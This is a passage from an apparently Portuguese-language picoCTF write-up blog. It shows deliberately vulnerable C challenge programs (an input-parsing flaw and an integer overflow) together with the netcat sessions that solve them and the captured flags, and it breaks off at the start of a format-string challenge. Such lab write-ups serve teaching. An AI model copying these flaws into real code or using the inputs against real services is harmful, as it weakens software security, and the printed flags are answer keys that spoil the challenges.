</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter the length of your data:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>len</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>length</span> <span class=o>=</span> <span class=nf>strtol</span><span class=p>(</span><span class=n>len</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please put in a valid length&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>inputs</span> <span class=o>&gt;</span> <span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>inputs</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>inputs</span><span class=p>],</span> <span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>input_lengths</span><span class=p>[</span><span class=n>inputs</span><span class=p>]</span> <span class=o>=</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Your entry number is: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>inputs</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>inputs</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>data_read</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>entry</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>entry_number</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>output</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter the entry number of your data:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>entry</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>entry_number</span> <span class=o>=</span> <span class=nf>strtol</span><span class=p>(</span><span class=n>entry</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fseek</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_END</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>entry_number</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>strncpy</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=n>data</span><span class=p>[</span><span class=n>entry_number</span><span class=p>],</span> <span class=n>input_lengths</span><span class=p>[</span><span class=n>entry_number</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>**</span> <span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=sc>&#39;\0&#39;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>command</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Hi, welcome to my echo chamber!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Type &#39;1&#39; to enter a phrase into our database&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Type &#39;2&#39; to echo a phrase in our database&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Type &#39;3&#39; to exit the program&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>command</span> <span class=o>=</span> <span class=nf>strtol</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please put in a valid number&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>data_write</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Write successful, would you like to do anything else?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>inputs</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;No data yet&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=nf>data_read</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Read successful, would you like to do anything else?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please type either 1, 2 or 3&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Maybe breaking boundaries elsewhere will be helpful&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Não recebemos nenhum binário compilado aqui. Podemos, entretanto, compilar nós mesmos para testar as coisas.</p><p>Olhando o source code, precisamos dar trigger nessa condicional:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>entry_number</span> <span class=o>=</span> <span class=nf>strtol</span><span class=p>(</span><span class=n>entry</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fseek</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_END</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Para entrar na condicional, é necessário garantir que a conversão da string <code>entry</code> para long integer usando a <code>strtol</code> resulte em <code>0</code>. Dá para conseguir isso fornecendo um input como <code>0</code> ou alguma coisa inválida tipo <code>abc</code>.</p><p>Aqui o meu solve:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc saturn.picoctf.net 56510
</span></span><span class=line><span class=cl>Hi, welcome to my echo chamber!
</span></span><span class=line><span class=cl>Type &#39;1&#39; to enter a phrase into our database
</span></span><span class=line><span class=cl>Type &#39;2&#39; to echo a phrase in our database
</span></span><span class=line><span class=cl>Type &#39;3&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>Please enter your data:
</span></span><span class=line><span class=cl>nvsuinvfuisj
</span></span><span class=line><span class=cl>Please enter the length of your data:
</span></span><span class=line><span class=cl>10
</span></span><span class=line><span class=cl>Your entry number is: 1
</span></span><span class=line><span class=cl>Write successful, would you like to do anything else?
</span></span><span class=line><span class=cl>2
</span></span><span class=line><span class=cl>2
</span></span><span class=line><span class=cl>Please enter the entry number of your data:
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
</span></span></code></pre></td></tr></table></div></div><p>flag: <code>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}</code></p><h2 id=two-sum>two sum<a hidden class=anchor aria-hidden=true href=#two-sum>#</a></h2><p>Source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>addIntOvf</span><span class=p>(</span><span class=kt>int</span> <span class=n>result</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=kt>int</span> <span class=n>b</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>a</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>b</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>result</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>a</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>b</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>result</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>num1</span><span class=p>,</span> <span class=n>num2</span><span class=p>,</span> <span class=n>sum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;n1 &gt; n1 + n2 OR n2 &gt; n1 + n2 </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What two positive numbers can make this possible: </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>num1</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>num2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You entered %d and %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>num1</span><span class=p>,</span> <span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>sum</span> <span class=o>=</span> <span class=n>num1</span> <span class=o>+</span> <span class=n>num2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>addIntOvf</span><span class=p>(</span><span class=n>sum</span><span class=p>,</span> <span class=n>num1</span><span class=p>,</span> <span class=n>num2</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;No overflow</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nf>addIntOvf</span><span class=p>(</span><span class=n>sum</span><span class=p>,</span> <span class=n>num1</span><span class=p>,</span> <span class=n>num2</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You have an integer overflow</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>num1</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>num2</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>flag</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;flag not found: please run this on the server</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>60</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;YOUR FLAG IS: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Não recebemos nenhum binário compilado.</p><p>Para resolver o problema, precisamos acionar o seguinte código:<br><code>else if (addIntOvf(sum, num1, num2) == -1)</code><br>e esse:<br><code>if (num1 > 0 || num2 > 0)</code><br>Para que a função <code>addIntOvf</code> retorne <code>-1</code>, precisamos fornecer dois inteiros positivos que resultem em um inteiro negativo (o que indica um overflow). Precisamos escolher dois inteiros positivos devido à segunda condição mencionada.</p><p><code>int</code> é uma variável de 4 bytes. O tamanho máximo dela é <code>2147483647</code> (2^31 - 1). Então se tivermos <code>num1</code> como <code>2147483647</code> e <code>num2</code> como <code>1</code>, teremos um integer overflow. Vamos tentar isso:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc saturn.picoctf.net 62116
</span></span><span class=line><span class=cl>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2
</span></span><span class=line><span class=cl>What two positive numbers can make this possible:
</span></span><span class=line><span class=cl>2147483647
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>You entered 2147483647 and 1
</span></span><span class=line><span class=cl>You have an integer overflow
</span></span><span class=line><span class=cl>YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}
</span></span></code></pre></td></tr></table></div></div><p>flag: <code>picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}</code></p><h2 id=format-string-0>format string 0<a hidden class=anchor aria-hidden=true href=#format-string-0>#</a></h2><p>Aqui o source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
